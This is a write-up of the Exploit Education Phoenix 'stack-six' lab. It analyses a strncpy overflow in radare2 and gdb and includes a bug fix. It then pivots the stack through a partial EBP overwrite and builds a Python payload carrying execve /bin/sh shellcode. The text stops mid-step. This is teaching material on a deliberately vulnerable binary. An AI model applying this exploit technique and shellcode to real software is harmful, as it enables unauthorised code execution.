# Stack 6

Write-up for: [https://exploit.education/phoenix/stack-six/][Stack Six]

<!--more-->

The goal is to take control of execution. Input can be passed to the program
via the `ExploitEducation` environment variable.

```
user@phoenix-amd64:/opt/phoenix/i486$ ./stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, Hello
```

# Static analysis

- a pointer to the environment variable is stored in a local variable (ebp - local_ch)
- the `greet` function is called with this pointer as an argument

The `greet` function is the most interesting part of the program. Let's inspect it in detail:

```
radare2 stack-six
aa
VV @ sym.greet
```

First, the length of the environment variable (passed as a pointer argument) is stored at `ebp - local_ch`. If the length is greater than 127 (0x7f), 127 is stored as the length instead.

```
call sym.imp.strlen ;[a]; size_t strlen(const char *s);  |
mov dword [ebp - local_ch], eax
...
// store 0x7f instead
cmp eax, 0x7f
jbe 0x80485af // jump below or equal
mov dword [ebp - local_ch], 0x7f 
```

Next, in `greet`, the global variable `what` is stored in `eax` and then copied to the buffer at `ebp - local_8ch` using `strcpy`.
After that, the length of the buffer (at `ebp - local_8ch`) is calculated with `strlen`. The result of this call is used to determine the first argument to `strncpy`, which copies up to 127 bytes of the argument value (the environment value) to `buffer + strlen(buffer)`.

# The bug

Now, the bug is evident. The `buffer` can hold 128 bytes including the terminating null byte. A constant string is copied to the buffer first. Afterwards, seemingly bounds checked,a user-provided string is copied after that. However, the bounds check does not take into account that the value is not written to the beginning of the buffer.

``` C
maxSize = strlen(who);
if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
}


strcpy(buffer, what);
strncpy(buffer + strlen(buffer), who, maxSize); // THIS CAN OVERFLOW BY strlen(buffer) bytes
```

As an attacker, we can overflow the stack buffer variable by a maximum of `strlen(buffer)`.

# Fixing the bug

To fix the issue, the maximum size calculation to be used in `strncpy` would need to happen after the first `strcpy` and would need to subtract `strlen(buffer)` from the maximum of 127 bytes.

# Dynamic analysis

Some information required for exploiting the bug can be more easily obtained via inspecting the program at runtime.

First, we need the size of the global variable `what` to determine `strlen(buffer)` at the time of the overflow:

```
(gdb) print (char*)what
$1 = 0x80486c0 "Welcome home, "
```

The string at the beginning of the 128 byte buffer is "Welcome home, " which, including the terminating null byte, is 15 bytes long. That means we can overwrite the buffer by at most 15 bytes. Not enough for placing our shellcode but maybe enough to redirect execution.

# Exploitation

The plan of attack is to overwrite the stored return address of `greet` in order to control `eip`. Afterwards, we will try to store our shellcode somewhere and jump there.

In order to overwrite the return address, we need the offset of the address to buffer. This can be determined in gdb by inspecting the stack at various points of execution.

Address of user input: 0xffffd4bc
Return address (this is what we look for on the stack): 0x0804865f
Stored return address location: 0xffffd54c

Offset = 0xffffd54c - 0xffffd4bc = 144

This is a problem because the maximum size we can write is 127 + 15 = 142.
That's enough to crash the program, but not enough to directly overwrite EIP.
Let's see if there is anything we can control:

```
$- export ExploitEducation=`python -c 'print "A" * 127'`

```

Using the maximum overflow length, we can observe that we control the LSB of the EBP register.
How is this helpful in controlling execution? During the return from `greet` EBP is used to restore ESP. Then, the value from the top of ESP is used to load EIP in order to continue execution. Since we control the value at the overwritten EBP address (0x41414141), we should be able to overwrite EIP.

saved ebp: 0xffffd558 @ 0xffffd528

In the debugger we can see that we overwrite the last byte of the saved EBP.

```
0xffffd520:     0x41414141      0x41414141      0xffffd541      0x0804865f
```

Using this technique, we can manipulate ESP in the `main` function. Just before leaving `main`, its value is: `0xffffd545 = overwritten EBP (0xffffd541) + 0x4`.

Just before leaving `main` the value stored at that address is 0x0, leading to a crash during return (SIGSEGV). The goal is now to manipulate the last byte of the stored EBP, so that EBP+0x4 points to a value we control.

```
(gdb) x/xw $esp
0xffffd545:     0x00000000

(gdb) x/16xw $esp-41
0xffffd51c:     0x00000000      0x41414141      0xffffd5e4      0x00000001
0xffffd52c:     0x0804866b      0x08049930      0x00000000      0x00000000
0xffffd53c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd54c:     0xffffded6      0x00000000      0xffffd570      0xffffd5ec
```

```
0x08048673 <+104>:   mov    ecx,DWORD PTR [ebp-0x4]
```

Here, the value at ebp-0x4 is stored in ecx. This is crucial since ECX will be used to restore ESP before leaving `main`.
This means, if we can control the value at EBP-0x4 we can set ESP to an arbitrary value before leaving `main`. If we can do this, we can control EIP and gain arbitrary code execution.


```
0x08048676 <+107>:   leave
=> 0x08048677 <+108>:   lea    -0x4(%ecx),%esp
0x0804867a <+111>:   ret
```

When leaving `main`, ESP is set to ECX-0x4. Remember, ECX was previously set to an attacker-controlled value. 

First, we need to find the offset that can be used to arbitrarily set the last byte of EBP. This is easy, since it is only one byte, it is most likely the very last byte of our payload. Let's confirm this:

```
export ExploitEducation=`python -c 'print "A" * 126 + "B"'`

(gdb) break *main+107

```

We can see that before leaving main, EBP is set to 0xffffd542. This means we can control the LSB by setting the last byte of our payload. Great!

Next, we need to find a suitable byte. This means having user-controlled data at EBP-0x4. To do that, let's just look at the surroundings of what we currently have:

```
(gdb) x (0xffffd544-0x4)
0xffffd540:     0x41414141
```

This looks promising! Setting the byte to 0x44 lands us at some user-controlled value. Now, we need to find the offset of this value. Let's do this by using a unique pattern generated by https://github.com/Svenito/exploit-pattern.

```
~/exploit-pattern [master] » python pattern.py 126
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1

user@phoenix-amd64:/opt/phoenix/i486$ export ExploitEducation=`python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1" + "B"'`

(gdb) x/4c 0xffffd540
0xffffd540:     48 '0'  65 'A'  101 'e' 49 '1'

~/exploit-pattern [master] » python pattern.py 0Ae1
Pattern 0Ae1 first occurrence at position 122 in pattern.
```

This tells us, that the user-controlled word is at offset 122 in our payload. Let's confirm this by writing something specific there:

```
user@phoenix-amd64:/opt/phoenix/i486$ export ExploitEducation=`python -c 'print "A" * 122 + "CCCC" + "B"'`

(gdb) x/4c 0xffffd540
0xffffd540:     67 'C'  67 'C'  67 'C'  67 'C'
```

This works. To recap, now we can control ESP because ESP is set to ECX-0x4 and ECX is set to whatever is stored at EBP-0x4. The value that we store there should therefore point to our buffer. Then we can provide a new value for EIP and the game is over. Our payload currently looks like this:

`[A*122][CCCC][0x44]`. This should lead to a ECX value of 0x43434343 (CCCC). Let's confirm:

```
(gdb) info reg
eax            0x0                 0
ecx            0x43434343          1128481603
```

Now all that is left is find a good address to jump to. Ideally some area of memory that we control via the environment variable.
Let's check were our buffer is before it is printed out in `main`:

```
(gdb) x/64xw 0x8049930
0x8049930:      0x636c6557      0x20656d6f      0x656d6f68      0x4141202c
0x8049940:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049950:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049960:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049970:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049980:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049990:      0x41414141      0x41414141      0x41414141      0x41414141
0x80499a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x80499b0:      0x41414141      0x41414141      0x43434343      0xffffd544
0x80499c0:      0x0804865f      0xffffdef3      0x00000000      0x00000000
0x80499d0:      0x00000000      0x00000000      0x000000b1      0x00000620
0x80499e0:      0xf7ffb968      0xf7ffb968      0x00000000      0x00000000
0x80499f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049a00:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049a10:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049a20:      0x00000000      0x00000000      0x00000000      0x00000000
```

0x8049940 looks like a good candidate. To load it as ESP, we have to add 0x4, so we use 0x8049944 for the value at EBP-0x4 that is loaded into ECX.

Running the program now is very promising:

```
eip            0x41414141          0x41414141
```

We control EIP! The game is now over :) All that's left is to write some shellcode into this buffer instead of "A"s.
This is our final exploit:

```python
buf = "\x08\x04\x99\x46"[::-1] # top of "new stack" -> will be EIP
buf += "\x90" * 8 # some leeway
buf += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # /bin/sh
buf += "\x90" * (122 - len(buf)) # padding
buf += "\x08\x04\x99\x42"[::-1] # new ECX (ESP + 0x4)
buf += "\x44" # LSB for EBP
print buf
```

Running it in gdb works! We have a shell!

```

However, since we forgot about the environment difference between gdb and outside, it does not work standalone. Let's fix that.
In order to make it work outside we need to fix the target addresses used in our exploit since they will be shifted due to gdb having additional environment variables in front of the stack. The process is the same: look at the memory just before leaving `main`.

To provide the same environment, we need to run the following in gdb:

```
unset env LINES
unset env COLUMNS
set env _ /opt/phoenix/i486/stack-six
```

Then we can determine a new LSB for EBP so we can control EIP reliably:

1. Set LSB of EBP (buf[127]) so that EBP-0x4 is controlled by user:
    0x54
